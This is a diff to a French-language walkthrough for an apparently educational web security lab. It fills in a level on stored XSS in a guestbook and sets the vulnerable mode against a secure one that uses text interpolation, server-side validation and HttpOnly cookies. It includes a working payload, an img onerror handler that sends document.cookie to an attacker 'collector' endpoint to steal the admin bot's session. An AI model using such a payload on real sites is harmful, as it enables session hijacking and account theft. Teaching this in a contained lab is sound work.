@@ -40,7 +40,29 @@ Une fonction `window.revealFlag()` n'existe qu'en mode vulnérable.
 
 ## Niveau 2 — XSS stockée : « Le livre d'or » (étape 3)
 
-_À compléter._
+**But** : voler le cookie de session du bot administrateur, qui contient le flag.
+
+**En mode vulnérable** :
+1. Publier un message contenant un gestionnaire d'événement qui exfiltre le cookie
+   du bot vers le collecteur de l'attaquant, par exemple :
+   `<img src=x onerror="fetch('/api/evil/collect?c='+document.cookie)">`.
+2. Cliquer sur « Faire relire les messages par le bot ». Le bot relit le livre d'or
+   dans le navigateur du joueur : le serveur lui attribue une session `ba_admin`
+   **non HttpOnly** (porteuse du flag), et le message est réinjecté en HTML brut
+   (`innerHTML`) — le payload s'exécute dans sa session.
+3. Le cookie volé apparaît dans la « console du collecteur » : il contient le flag,
+   à recopier dans le formulaire.
+
+- Le collecteur écoute sur `/api/evil/collect` (même origine) : `evil.localhost`
+  de la maquette ne résout pas, viser le chemin interne.
+- Raccourci : le payload peut aussi lire directement `document.cookie` une fois le
+  bot lancé (c'est du JavaScript exécuté dans la vue admin).
+- Une balise `<script>` injectée via `innerHTML` ne s'exécute pas : utiliser un
+  attribut d'événement (`onerror`, `onload`…).
+
+**En mode sécurisé** : le message est rendu comme du texte (interpolation `{{ }}`),
+le serveur refuse tout HTML (400, validation Zod), la session du bot est `HttpOnly`
+— l'attaque n'exfiltre rien et le collecteur reste vide.
 
 ## Niveau 3 — CSP : « Le mur invisible » (étape 4)
 
